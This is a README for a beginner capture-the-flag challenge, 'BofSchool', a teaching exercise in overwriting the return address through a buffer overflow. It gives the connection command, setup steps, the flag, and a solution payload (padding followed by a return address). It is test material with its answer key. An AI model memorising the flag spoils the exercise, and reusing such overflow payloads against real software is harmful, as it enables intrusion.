# BofSchool

Interactive ncurses buffer overflow program.

# Learning Objective

Provides a soft introduction to the concept of overwriting `rip` through a buffer overflow, without having participants struggle with learning debugging skills.

# Description (public)

```
Welcome to Pwn101.
`stty -icanon -echo ; nc whitehacks.ctf.sg 12001; stty sane`

Controls:
`q`          - Quit the program
`<Backspce>` - Delete character
`<Enter>     - Send payload
Use `\xXX` to send hex encoded characters (useful for unprintable characters), e.g. "\x44\x41\x42" is equivalent to "DAB"
```

# Setup Guide

1. Use the docker-compose.yml in the parent directory to deploy the service at port 11001
2. Test the service with `stty` and netcat with the provided command, and type `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x66\x05\x40\x00\x00\x00\x00\x00` to get the flag

# Flag

`WH2020{A_for_pwning!}`

# Solution

Connect to the service and type `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x66\x05\x40\x00\x00\x00\x00\x00`, flag should be shown on screen within a few seconds.
